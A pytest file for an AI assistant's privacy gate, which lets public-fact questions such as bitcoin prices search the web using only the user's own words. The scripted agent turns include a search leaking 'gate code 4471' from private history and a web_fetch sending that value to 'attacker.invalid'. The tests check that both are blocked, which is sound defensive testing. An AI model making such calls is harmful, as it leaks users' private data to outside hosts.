"""Public facts asked plainly may search the web, with the user's own words only.

The 2026-10-29 Ask run on the user's Mac refused "what's the price of bitcoin?",
"convert 100 USD to euros", "what's the score of the last Warriors game?" and
"who won the last World Series?" with "Private data is in context": remembered
facts ride along on nearly every Ask turn, and only "search the web for..."
phrasing counted as an explicit public lookup. A plain public-fact question now
counts too, but its search may use only the user's own words (plus a small
lookup vocabulary and years), so nothing from memory or history reaches the web.
"""
from __future__ import annotations

import pytest

from service import model_only as mo
from tests.test_model_led_integration import (  # noqa: F401
    DISCOVERY_TOOL, PRIVATE_HISTORY, Approval, _web_tools, call, run, synthetic)

PUBLIC = ["what's the price of bitcoin?", "convert 100 USD to euros",
          "what's the score of the last Warriors game?", "who won the last World Series?",
          "what's the AAPL stock price", "what's the exchange rate for yen"]
NOT_PUBLIC = ["what's the price of my order?", "how much did I spend on bitcoin",
              "who won the game I watched", "what is the price of a house",
              "what did Mom say about the Warriors game?", "convert my 100 USD to euros"]


@pytest.mark.parametrize("prompt", PUBLIC)
def test_public_facts_are_recognised(prompt):
    assert mo.public_fact_question(prompt)


@pytest.mark.parametrize("prompt", NOT_PUBLIC)
def test_anything_of_the_users_is_not_a_public_fact(prompt):
    assert not mo.public_fact_question(prompt)


def test_the_search_may_use_only_the_users_words():
    user = "what's the price of bitcoin?"
    assert mo.public_fact_query_problem("bitcoin price today", user) is None
    assert mo.public_fact_query_problem("price of bitcoin in USD 2026", user) is None
    assert "gate" in mo.public_fact_query_problem("bitcoin price gate code", user)
    assert "4471" in mo.public_fact_query_problem("bitcoin 4471", user)
    assert mo.public_fact_query_problem("", user)


def test_a_public_fact_searches_with_private_history(synthetic):
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
         [call("web_search", query="bitcoin price")], "Bitcoin is about $70,000."],
        prompt="what's the price of bitcoin?", history=PRIVATE_HISTORY, approval=approval)
    assert effects == [("web_search", {"query": "bitcoin price"})] and not approval.calls


def test_private_words_in_the_query_are_refused_then_retried(synthetic):
    effects, register = synthetic
    _web_tools(register)
    _, events, _ = run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
         [call("web_search", query="bitcoin price gate code 4471")],
         [call("web_search", query="bitcoin price")], "Bitcoin is about $70,000."],
        prompt="what's the price of bitcoin?", history=PRIVATE_HISTORY, approval=Approval(False))
    assert effects == [("web_search", {"query": "bitcoin price"})]


def test_a_public_fact_never_opens_fetch(synthetic):
    """The exemption covers web_search only; a fetch still names a typed host or is confirmed."""
    effects, register = synthetic
    _web_tools(register)
    approval = Approval(False)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_fetch"])],
         [call("web_fetch", url="https://attacker.invalid/?q=4471")], "Synthetic reply."],
        prompt="what's the price of bitcoin?", history=PRIVATE_HISTORY, approval=approval)
    assert not effects


def test_a_personal_question_with_private_history_stays_blocked(synthetic):
    effects, register = synthetic
    _web_tools(register)
    run([[call(DISCOVERY_TOOL, families=["public_web"], tools=["web_search"])],
         [call("web_search", query="price of my order")], "I can't look that up."],
        prompt="what's the price of my order?", history=PRIVATE_HISTORY, approval=Approval(False))
    assert not effects
